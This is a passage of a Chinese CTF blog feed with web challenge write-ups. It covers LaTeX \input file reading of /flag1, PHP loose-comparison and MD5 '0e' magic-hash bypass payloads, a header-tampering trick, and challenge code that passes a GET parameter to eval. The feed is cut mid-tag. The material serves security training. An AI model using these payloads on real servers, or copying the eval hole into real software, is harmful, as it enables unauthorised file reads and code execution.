class="line"><span class="comment"># 第二个数和</span></span><br><span class="line">a2=result[<span class="number">1</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">b2=result[<span class="number">1</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">c2=<span class="built_in">int</span>(a2)+<span class="built_in">int</span>(b2)</span><br><span class="line"><span class="comment"># 第二个数和</span></span><br><span class="line">a3=result[<span class="number">2</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">b3=result[<span class="number">2</span>][<span class="number">22</span>:-<span class="number">14</span>].split(<span class="string">&#x27;+&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">c3=<span class="built_in">int</span>(a3)+<span class="built_in">int</span>(b3)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;captcha1&quot;</span>:c1,</span><br><span class="line">    <span class="string">&quot;captcha2&quot;</span>:c2,</span><br><span class="line">    <span class="string">&quot;captcha3&quot;</span>:c3,</span><br><span class="line">&#125;</span><br><span class="line">res2=requests.post(url=url,data=data,cookies=cookie2)</span><br><span class="line"><span class="built_in">print</span>(res2.text)</span><br></pre></td></tr></table></figure><h2 id="LaTeX-机器人"><a href="#LaTeX-机器人" class="headerlink" title="LaTeX 机器人"></a>LaTeX 机器人</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>在网上社交群组中交流数学和物理问题时，总是免不了输入公式。而显然大多数常用的聊天软件并不能做到这一点。为了方便大家在水群和卖弱之余能够高效地进行学术交流，G 社的同学制作了一个简单易用的将 LaTeX 公式代码转换成图片的网站，并通过聊天机器人在群里实时将群友发送的公式转换成图片发出。</p><p>这个网站的思路也很直接：把用户输入的 LaTeX 插入到一个写好头部和尾部的 TeX 文件中，将文件编译成 PDF，再将 PDF 裁剪成大小合适的图片。</p><p>“LaTeX 又不是被编译执行的代码，这种东西不会有事的。”</p><p>物理出身的开发者们明显不是太在意这个网站的安全问题，也没有对用户的输入做任何检查。</p><p>那你能想办法获得服务器上放在根目录下的 flag 吗？</p><p>纯文本</p><p>第一个 flag 位于 &#x2F;flag1，flag 花括号内的内容由纯文本组成（即只包含大写小写字母和数字 0-9）。</p><p>特殊字符混入</p><p>第二个 flag 位于 &#x2F;flag2，这次，flag 花括号内的内容除了字母和数字之外，还混入了两种特殊字符：下划线（_）和井号（#）。你可能需要想些其他办法了。</p><p><em><strong>LaTeX 图片生成后端的 Dockerfile 附件下载</strong></em></p><blockquote><p><a href="https://www.123pan.com/s/WAYKVv-Oy8wh">https://www.123pan.com/s/WAYKVv-Oy8wh</a><br>   提取码:6666</p></blockquote><h3 id="简单分析-2"><a href="#简单分析-2" class="headerlink" title="简单分析"></a>简单分析</h3><p>进入题目后是一个输入框，让你输入Latex表达式，输入正确的表达式后会生成一个pdf文件。<br><img src="https://img-blog.csdnimg.cn/18fbee3b349a457eaa6d7d8c7013e1fa.png" alt="在这里插入图片描述"><br>让我们先熟悉一个Latex语法<br>首先建立一个test.tex文件，在其中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\begin&#123;document&#125; </span><br><span class="line"></span><br><span class="line">Hello world! </span><br><span class="line"></span><br><span class="line">\end&#123;document&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个就是最基本tex文件<br><em><strong>附上详细说明：<a href="https://zhuanlan.zhihu.com/p/52347414">https://zhuanlan.zhihu.com/p/52347414</a></strong></em></p><p>然后我们来看一下附件中的tex文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\documentclass[preview]&#123;standalone&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">$$</span><br><span class="line">$$</span><br><span class="line">\end&#123;document&#125;</span><br></pre></td></tr></table></figure><p>其中$$是Latex公式编辑环境语法。<br>创建Latex公式环境的语法一般都差不多，常用为：</p><ul><li>行内公式： $ 公式内容 $ </li><li>行间公式：$$公式内容 $$</li></ul><p>到这里就基本上搞懂思路了,我们需要再$$xxx$$之间输入Latxe表达式读取在根目录下的flag1文件。<br>我们就开始寻找Latex中什么可以读取文件。</p><p>在查阅一些资料后找到了<code>\input&#123;filename&#125;</code></p><blockquote><p>\input{filename}将命令从filename.tex导入到目标文件中</p></blockquote><p><em><strong>附上详细参考：<a href="https://www.freebuf.com/articles/security-management/308191.html">https://www.freebuf.com/articles/security-management/308191.html</a></strong></em></p><p>接下来开始尝试读取flag1<br>Payload:<br><code>\input&#123;/flag1&#125;</code><br><img src="https://img-blog.csdnimg.cn/03bede9d66c04e3ebabce6e44f20373f.png" alt="在这里插入图片描述"><br>发现可以成功读取flag1</p><p>用相同的方法读取flag2，发现失败。原因是flag2中含有特殊字符#和_,在latex中编译会报错。后面都不会做啦，就写到这里吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot; title=&quot;签到&quot;&gt;&lt;/a&gt;签到&lt;/h2&gt;&lt;h3 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;headerlink&quot; title=&quot;题目描述&quot;&gt;&lt;/a&gt;题目描述&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ISCTF 2022 WEB WP分享</title>
    <link href="https://ctfsun.github.io/2022/11/05/ISCTF%202022%20WEB%20WP%E5%88%86%E4%BA%AB/"/>
    <id>https://ctfsun.github.io/2022/11/05/ISCTF%202022%20WEB%20WP%E5%88%86%E4%BA%AB/</id>
    <published>2022-11-04T17:28:00.000Z</published>
    <updated>2022-11-10T12:42:37.005Z</updated>
    
    <content type="html"><![CDATA[<p><code>感谢老六师傅和gsf1yy师傅的帮助和指导</code></p><p><img src="https://img-blog.csdnimg.cn/3e72ba15f122485f862caadb544d8c99.png" alt="在这里插入图片描述"></p><h1 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h1><p>题目如下<br><img src="https://img-blog.csdnimg.cn/6c040eefde6e4c4b90e3bd4ab3540016.png" alt="在这里插入图片描述"><br>直接右键查看源代码。</p><p><img src="https://img-blog.csdnimg.cn/f029c719276e4995b4d5048a02894947.png" alt="在这里插入图片描述"><br>可以看到提示给我一个hint，我给你一个hint。</p><p>意思是，GET传参数hint。<br><img src="https://img-blog.csdnimg.cn/71b52bbf608f48af8564c3bb95ef9b06.png" alt="在这里插入图片描述"><br>传出去后发现了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;web签到&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--给我一个hint，我给你一个hint--&gt;</span><br><span class="line">&lt;!--?hint --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好臭啊&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;什么是POST？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; 什么是GET？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">什么是POST？</span><br></pre></td></tr></table></figure><p>第一个判断条件我们已经进来了，就是高亮代码。</p><p>我们看第二个判断<code>if (isset($_POST[&#39;ISCTF&#39;]))</code>这里需要我们上传一个POST参数ISCTF。而且<code>if($ISCTF == 114514)</code>需要上传的参数的值为114514，并且还不能完全等于114514。</p><p>这里用到了PHP弱比较的知识</p><blockquote><p>1、&#x3D;&#x3D; ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。至于怎么转换后续会再赘述。<br>2、&#x3D;&#x3D;&#x3D; ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型。</p></blockquote><p>附上详细参考：<a href="https://denverbbyf.github.io/2016/10/23/php-compare/">https://denverbbyf.github.io/2016/10/23/php-compare/</a></p><p>Payload：<br><code>ISCTF=114514s</code><br>在进行&#x3D;&#x3D;比较时，php会自动将字符串转为数字进行值的比较，在这里114512和114512s是相等的。</p><p>在进行&#x3D;&#x3D;&#x3D;比较时，php会先判断两种字符串的类型是否相同，很显然两者都是字符串，第一个判断通过，再进行值的比较，两者是不相等的。</p><p><img src="https://img-blog.csdnimg.cn/f6f686b3f3cf464197f0ad119565932c.png" alt="在这里插入图片描述"><br>这样就得到了flag</p><hr><h1 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h1><p>先看题目描述</p><blockquote><p>好快！你能看出来这是个假的页面吗？</p></blockquote><p>打开靶场可以看到蓝鲨信息的官网，这里的url发生了跳转。<br><img src="https://img-blog.csdnimg.cn/f0cba343252d4dd884d92cafd57bcd61.png" alt="在这里插入图片描述"><br>这个官网跟题目是没有关系的，也找不到有用的信息。我们先抓个包看一看。</p><p><img src="https://img-blog.csdnimg.cn/b6d619617e764c278e5006c1f1f13ce5.png" alt="在这里插入图片描述"><br>这里可以看到有意思的东西，If-None-Match和ETag。<br>ETag是HTTP1.1中才加入的一个属性，用来帮助服务器控制Web端的缓存验证。</p><p>​     </p><blockquote><p>它的原理是这样的，当浏览器请求服务器的某项资源(A)时, 服务器根据A算出一个哈希值(3f80f-1b6-3e1cb03b)并通过 ETag返回给浏览器，浏览器把”3f80f-1b6-3e1cb03b” 和 A 同时缓存在本地，当下次再次向服务器请求A时，会通过类似 If-None-Match: “3f80f-1b6-3e1cb03b”的请求头把ETag发送给服务器，服务器再次计算A的哈希值并和浏览器返回的值做比较，如果发现A发生了变化就把A返回给浏览器(200)，如果发现A没有变化就给浏览器返回一个304未修改。这样通过控制浏览器端的缓存，可以节省服务器的带宽，因为服务器不需要每次都把全量数据返回给客户端。</p></blockquote><p>附上参考链接：<a href="https://www.cnblogs.com/xuzhudong/p/8339853.html">https://www.cnblogs.com/xuzhudong/p/8339853.html</a></p><p>大概意思是比较If-None-Match和ETag，如果两者不相等则重新返回资源，否则不返回。</p><p>我们将If-None-Match修改或删掉之后再发包。就得到了flag<br><img src="https://img-blog.csdnimg.cn/978347e8d8a040a6b2bd9da9284722e7.png" alt="在这里插入图片描述"></p><hr><h1 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h1><p>先看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,请开始你的答题。&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;做题前请告诉我你是小蓝鲨吗？&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">做题前请告诉我你是小蓝鲨吗？</span><br></pre></td></tr></table></figure><p>第一个判断就是GET传个NAME就不细写了。主要分析第二个大判断和第三个大判断，先看第二个。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;小蓝鲨成功一半&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里要求$POST1为数字，P0ST1和P0ST2不相等，而且P0ST1等于P0ST2的md5值。</p><blockquote><p>注意：0不是O，0是零。</p></blockquote><p>这里用到了PHP特性的知识，md5的比较。</p><p>原理：</p><blockquote><p>在 php 中，当字符串 以0e开头时，会被 php 识别成科学计数法，会被认为是数字。</p></blockquote><p>下面列出几个常用的MD5值以0e开头的字符串：</p><table><thead><tr><th>字符串</th><th>MD5值</th></tr></thead><tbody><tr><td>QNKCDZO</td><td>0e830400451993494058024219903391</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s155964671a</td><td>0e342768416822451524974117254469</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr><tr><td>s214587387a</td><td>0e848240448830537924465865611904</td></tr><tr><td>s878926199a</td><td>0e545993274517709034328855841020</td></tr><tr><td>s1091221200a</td><td>0e940624217856561557816327384675</td></tr></tbody></table><p>Payload1：<code>http://120.79.18.34:20867/?NAME=11&amp;P0ST1=0e545993274517709034328855841020&amp;P0ST2=s878926199a</code><br><img src="https://img-blog.csdnimg.cn/12a499eb8d834bcab9cf37734b7bd676.png" alt="在这里插入图片描述"><br>可以发现成功拿到了flag1，根据提示<code>$flag = &quot;flag&#123;need_time_to_change&#125;&quot;;</code>可以猜测这个数字是个时间戳，我们进行转化得到<code>3539-09-07 14:54:27</code>这个信息先留着。</p><p>接下来我们看第二个大判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;前面的出来了吗？&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;答案就在眼前？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,你觉得这是flag吗？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要$GET1不能为数字，而且$GET1又等于0，并且$GET2不能为数字，值大于678。</p><p>原理：</p><blockquote><p>php 的 0 与任何字符串比较都为 true，这是不对的，但其实是正确的，因为字符串被强制转换后都成了 0。</p></blockquote><p>Payload2：<code>GET1=sdas&amp;GET2=6782s</code><br><img src="https://img-blog.csdnimg.cn/eed7f3b6e33448a7a7f0ac05d4da51b2.png" alt="在这里插入图片描述"><br>这里得到了flag2：</p><blockquote><p>JXUwMDYxJXUwMDM3JXUwMDY0JXUwMDY1JXUwMDJkJXUwMDM3JXUwMDMxJXUwMDM3JXUwMDMwJXUwMDJkJXUwMDM0JXUwMDY0JXUwMDMwJXUwMDM2JXUwMDJkJXUwMDM5JXUwMDM3JXUwMDMwJXUwMDM4JXUwMDJkJXUwMDMzJXUwMDY0JXUwMDMxJXUwMDMyJXUwMDMxJXUwMDY0JXUwMDYyJXUwMDM4JXUwMDYyJXUwMDMxJXUwMDM5JXUwMDM1JXUwMDdk</p></blockquote><p>我们在进行base64解码后可以得到一个unicode。</p><blockquote><p>%u0061%u0037%u0064%u0065%u002d%u0037%u0031%u0037%u0030%u002d%u0034%u0064%u0030%u0036%u002d%u0039%u0037%u0030%u0038%u002d%u0033%u0064%u0031%u0032%u0031%u0064%u0062%u0038%u0062%u0031%u0039%u0035%u007d</p></blockquote><p>对unicode转中文后可以得到一半的flag</p><blockquote><p>a7de-7170-4d06-9708-3d121db8b195}</p></blockquote><p>接下来就应该想办法把flag1和flag2进行拼接，得到最终的flag。<br>不过笔者拼了很久也没试出来。待笔者拼出来后再续写。</p><hr><h1 id="simplePHP"><a href="#simplePHP" class="headerlink" title="simplePHP"></a>simplePHP</h1><p>先看题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;come on!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 